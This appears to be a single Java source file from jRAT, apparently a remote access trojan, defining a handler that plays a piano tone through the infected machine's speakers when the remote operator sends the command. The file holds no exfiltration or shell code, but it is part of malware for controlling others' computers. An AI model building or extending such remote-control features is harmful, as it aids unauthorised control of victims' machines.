package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.Piano;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;


public class Packet66PianoNote implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int tone = con.readInt();
		boolean buzz = con.readBoolean();
		AudioFormat af = new AudioFormat(Piano.SAMPLE_RATE, 8, 1, true, true);
		SourceDataLine dl = AudioSystem.getSourceDataLine(af);
		dl.open(af, Piano.SAMPLE_RATE);
		dl.start();
		Piano.play(dl, Piano.values()[tone], 500);

		if (buzz) {
			Piano.play(dl, Piano.REST, 500);
		}
		dl.drain();
		dl.close();
	}

}
